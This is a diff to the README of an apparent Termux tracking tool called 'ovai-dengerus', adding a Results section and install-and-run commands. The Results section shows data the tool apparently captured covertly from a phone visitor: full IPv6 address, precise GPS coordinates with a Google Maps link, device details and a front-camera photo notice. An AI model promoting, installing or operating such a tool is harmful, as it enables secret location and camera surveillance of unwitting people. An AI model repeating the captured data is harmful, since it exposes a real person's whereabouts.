@@ -19,9 +19,9 @@
 ---
 
 
-[![GitHub stars](https://img.shields.io/github/stars/mar-pd/ovai-dengerus?style=social)](https://github.com/mar-pd/ovai-dengerus/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/mar-pd/ovai-dengerus?style=social)](https://github.com/mar-pd/ovai-dengerus/network)
-[![GitHub watchers](https://img.shields.io/github/watchers/mar-pd/ovai-dengerus?style=social)](https://github.com/mar-pd/ovai-dengerus/watchers)
+[![GitHub stars](https://img.shields.io/github/stars/master-pd/ovai?style=social)](https://github.com/mar-pd/ovai-dengerus/stargazers)
+[![GitHub forks](https://img.shields.io/github/forks/master-pd/ovai?style=social)](https://github.com/mar-pd/ovai-dengerus/network)
+[![GitHub watchers](https://img.shields.io/github/watchers/master-pd/ovai?style=social)](https://github.com/mar-pd/ovai-dengerus/watchers)
 
 </div>
 
@@ -81,7 +81,44 @@
 
 ---
 
+## Results 
 
+---
+👤 নতুন ভিজিটর!
+═══════════════════════════
+🌐 IP: 2404:1c40:1c8:9d30:6404:18ff:fe6b:691
+📱 ডিভাইস: মোবাইল
+🕐 সময়: 08-03-2026 14:40:50
+═══════════════════════════
+
+📍 নতুন লোকেশন পাওয়া গেছে!
+═══════════════════════════
+🌐 IP: 2404:1c40:1c8:9d30:6404:18ff:fe6b:691
+📍 ল্যাটিটিউড: 23.8358855
+📍 লংগিটিউড: 90.509392
+📏 অ্যাকুরেসি: 500 মিটার
+🕐 সময়: 08-03-2026 14:41:04
+═══════════════════════════
+🔗 গুগল ম্যাপে দেখুন : https://www.google.com/maps?q=23.8358855,90.509392
+
+
+📱 ডিভাইস ইনফরমেশন
+═══════════════════════════
+🌐 IP: 2404xxxxxx0:xxxxxxxxx
+📺 স্ক্রিন: 393x873
+🔋 ব্যাটারি: 100%
+📶 নেটওয়ার্ক: 5g
+🌐 ল্যাঙ্গুয়েজ: en-US
+💻 প্ল্যাটফর্ম: Linux armv81
+═══════════════════════════
+
+
+📸 নতুন ছবি তোলা হয়েছে!
+📷 ক্যামেরা: front
+🌐 IP: 2404:1xxxxxxxxxxxxxxxxx1
+🕐 সময়: 08-03-2026 14:41:07
+
+---
 
 ## ⚡ **QUICK INSTALLATION**
 
@@ -91,3 +128,11 @@ pkg update && pkg upgrade -y
 
 Install required packages
 pkg install git php curl wget openssh -y
+pkg install python
+pkg install git
+git clone https://github.com/master-pd/ovai.git
+cd ovai
+chmod +x ovai
+./ovai
+./start
+
